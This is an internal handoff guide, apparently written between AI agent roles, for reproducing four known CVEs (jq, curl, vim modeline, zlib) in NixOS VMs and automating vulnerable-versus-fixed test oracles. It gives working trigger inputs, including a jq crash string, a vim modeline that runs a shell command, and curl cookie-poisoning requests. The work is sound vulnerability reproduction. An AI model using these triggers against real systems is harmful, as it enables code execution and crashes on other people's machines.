# Validator Handoff Guide — Phase 4 Activation

**From**: Architect  
**To**: Validator  
**Date**: 2026-07-31  

---

## Quick Start

Each CVE now has:
1. ✅ Design Handoff (architecture + oracle specification)
2. ✅ Skeleton implementation (flake.nix + VM modules + test.py stubs)
3. ✅ PoC documentation (readme.md with CVE facts)

**Your role**: Verify skeleton works, complete missing nixpkgs pins, automate test.py.

---

## Per-CVE Quick Links

### CVE-2023-50246 (jq) ← LOWEST EFFORT (START HERE)

**Status**: Ready to test immediately  
**Effort**: ~30 mins

```bash
cd cves/cve-2023-50246-jq-heap-buffer-overflow

# 1. Check what you have
cat readme.md           # CVE facts
cat design-handoff...   # Oracle spec in .squad/decisions/inbox/

# 2. Start scenario
nice-archive scenario --case cve-2023-50246 --vulnerable true --popup false

# 3. In another terminal, via SSH:
ssh -o User=root -o StrictHostKeyChecking=no "vsock-mux://..." \
  'echo "-10E-1000000001" | jq .'
# Expected: crash with exit code 134 (ABRT)

# 4. Verify fixed variant
nice-archive scenario --case cve-2023-50246 --vulnerable false --popup false
# Same SSH command should exit 0

# 5. Automate in test.py
# test.py stub already has ab.check_* calls
# Just verify they work:
nice-archive test --case cve-2023-50246

# Done! Move to next CVE.
```

### CVE-2022-35252 (curl) ← MEDIUM EFFORT

**Status**: Missing curl 7.85.0+ pin  
**Effort**: ~1 hour (finding pins) + 30 mins (testing)

```bash
cd cves/cve-2022-35252-curl-cookie-poisoning

# 1. BLOCKER: Find nixpkgs commit with curl 7.85.0
# Research: curl 7.85.0 released Aug 31, 2022
# Use: nix-versions.com, GitHub search, or:
#   git log --all --grep="curl" --since="2022-08-31" --until="2022-09-15"
# Once found, update vm-client.nix:
#   fixedInfo.url = "https://github.com/NixOS/nixpkgs/archive/<COMMIT>.tar.gz"
#   fixedInfo.sha256 = "sha256:<HASH>"

# 2. Test HTTP server + curl flow
nice-archive scenario --case cve-2022-35252 --vulnerable true --popup false

# 3. Via SSH, verify HTTP flow:
ssh -o User=root "vsock-mux://..." \
  'curl -v -c /tmp/cookies.txt http://server:8080/fetch1 2>&1 | grep -i cookie'
# Should see Set-Cookie with form-feed (0x0c) - not printable

ssh -o User=root "vsock-mux://..." \
  'curl -v -b /tmp/cookies.txt http://server:8080/fetch2 2>&1 | grep "400\|200"'
# Should see "400 Bad Request" (poisoned cookie)

# 4. Test fixed variant
nice-archive scenario --case cve-2022-35252 --vulnerable false --popup false
# Same requests should see 200 (cookie rejected by curl)

# 5. Automate in test.py
# test.py already orchestrates requests
# Add HTTP status code assertion:
#   assert "400" in result2[1]  # or ab.check_http_status()
# Verify parsing works:
nice-archive test --case cve-2022-35252
```

### CVE-2019-12735 (Vim) ← MEDIUM EFFORT

**Status**: Missing vim version pins  
**Effort**: ~1 hour (finding pins) + 20 mins (testing)

```bash
cd cves/cve-2019-12735-vim-modeline-rce

# 1. BLOCKER: Find nixpkgs commits for vim versions
# Vulnerable: vim 8.1.0-8.1.1364 (June 2019 or earlier)
# Fixed: vim 8.1.1365+ (June 2019 or later)
# Use nix-versions or git log
# Once found, update vm-server.nix with commits + sha256

# 2. Test modeline RCE
nice-archive scenario --case cve-2019-12735 --vulnerable true --popup false

# 3. Via SSH, verify modeline execution:
ssh -o User=root "vsock-mux://..." \
  'vim -u NONE -N -es -i NONE +set\ modeline +read\ exploit/malicious.txt +quit 2>&1'

ssh -o User=root "vsock-mux://..." \
  'ls -la /tmp/exploit_marker'
# Should exist (file was created by modeline command)

# 4. Test fixed variant
nice-archive scenario --case cve-2019-12735 --vulnerable false --popup false
# File should NOT exist

# 5. Automate in test.py
# test.py has ab.check_file_exists() calls
# Verify exit codes and file checks work:
nice-archive test --case cve-2019-12735
```

### CVE-2018-25032 (zlib) ← HIGHEST EFFORT

**Status**: Missing zlib pins + PoC binary  
**Effort**: ~2 hours (finding pins + sourcing PoC) + 30 mins (testing)

```bash
cd cves/cve-2018-25032-zlib-deflate-overflow

# 1. BLOCKER: Find nixpkgs commits for zlib versions
# Vulnerable: zlib 1.2.11 (before March 2022)
# Fixed: zlib 1.2.12 (March 24, 2022)
# Update vm-server.nix with commits + sha256

# 2. BLOCKER: Source PoC binary
# Check zlib GitHub issue #605
# Find or generate pathological input that triggers deflate_stored() overflow
# Save to exploit/crafted_input.bin (binary file)
# TEST on host first:
#   nix shell nixpkgs#zlib-1.2.11
#   gcc -o poc exploit/zlib_poc.c -lz
#   ./poc < crafted_input.bin
#   # Should crash with exit code 134/139

# 3. Test zlib compression
nice-archive scenario --case cve-2018-25032 --vulnerable true --popup false

# 4. Via SSH, verify crash:
ssh -o User=root "vsock-mux://..." \
  'cve-2018-25032-trigger < exploit/crafted_input.bin 2>&1; echo "EXIT=$?"'
# Should show non-zero exit code (crash)

# 5. Test fixed variant
nice-archive scenario --case cve-2018-25032 --vulnerable false --popup false
# Should exit 0 (compression succeeds)

# 6. Automate in test.py
# test.py has exit code checks
# Verify with ab.check_exit_code() and ab.check_core_dump_exists()
nice-archive test --case cve-2018-25032
```

---

## Priority Order

1. **CVE-2023-50246** ← Test immediately, should just work
2. **CVE-2022-35252** ← Find curl pin, then test
3. **CVE-2019-12735** ← Find vim pins, then test
4. **CVE-2018-25032** ← Find zlib pins + source PoC, then test

---

## Common Issues & Fixes

### Issue: "ImportError: No module named assertion_blocks"
**Fix**: Ensure test.py is in correct case directory and imports are available
```python
import sys
sys.path.insert(0, "${nice_archive_lib_path}")
from nice_archive_lib import assertion_blocks as ab
```

### Issue: SSH backdoor socket path not found
**Fix**: Output from scenario startup should print SSH commands; use latest socket path
```bash
# Terminal 1 output shows:
# server: ssh -o User=root vsock-mux://run/user/.../server_host.socket
# Copy that exact path!
```

### Issue: vim modeline not executing in non-interactive mode
**Fix**: Ensure modeline is enabled and vim is actually reading the file:
```bash
# Try simpler approach first:
echo "# vim: set modeline | :execute '!touch /tmp/marker' :" > /tmp/test.txt
vim -u NONE /tmp/test.txt -c "quit"
ls -la /tmp/marker  # Check if file exists
```

### Issue: zlib compilation fails in VM
**Fix**: Ensure gcc and zlib-devel are in environment.systemPackages in vm-server.nix

### Issue: test.py passes but oracle feels wrong
**Fix**: Manually verify on SSH backdoor first
- Run command manually
- Check exit codes, file existence, HTTP status
- Then add ab.check_* assertions

---

## Reporting Back to Coordinator

Once each CVE passes `nice-archive test`, create an update in `.squad/decisions/inbox/`:

```markdown
# Validator Update — CVE-YYYY-NNNN

**Status**: PHASE 4 COMPLETE

- [x] Manual reproduction via SSH confirmed
- [x] Vulnerable variant exhibits exploit
- [x] Fixed variant blocks exploit
- [x] test.py automation in place
- [x] nice-archive test --case cve-YYYY-NNNN PASSES

**Nixpkgs pins verified**:
- Vulnerable: <commit> + sha256
- Fixed: <commit> + sha256

**Oracle confirmed**: <description>

Ready for Phase 5 (readme.md review) + Phase 6 (Reviewer gate).
```

---

## FAQ

**Q**: Can I test multiple cases in parallel?  
**A**: Yes! Each case is independent. Multiple scenarios can run simultaneously.

**Q**: Do I need to push changes to git?  
**A**: Not until after Reviewer approval. Validator changes (nixpkgs pins, test.py) stay in .squad/decisions/ until handoff.

**Q**: What if I can't find a nixpkgs commit?  
**A**: File blocker in .squad/decisions/ with what you tried. Include GitHub issue/advisory links.

**Q**: Can I modify vm-server.nix after starting?  
**A**: Yes! Rebuild with different params. Scenario is stateless per invocation.

**Q**: How do I debug test.py?  
**A**: Use SSH backdoor to run commands manually first, then add assertions incrementally.

---

## Success Criteria

Each CVE is "DONE" when:

✅ `nice-archive scenario --case cve-XXX --vulnerable true` starts without error  
✅ Manual SSH commands confirm exploit works (crash, file exists, HTTP status, etc.)  
✅ `nice-archive scenario --case cve-XXX --vulnerable false` starts and exploit is blocked  
✅ `nice-archive test --case cve-XXX` runs without error  
✅ Both vulnerable and fixed variants pass test.py assertions  
✅ test.py assertions match oracle from Design Handoff  

---

**Questions?** Check `.squad/decisions/inbox/design-handoff-cve-*.md` for oracle specs.

**Ready to start?** Pick CVE-2023-50246 and follow the jq example above. You've got this! 🚀

*End of Validator Handoff*
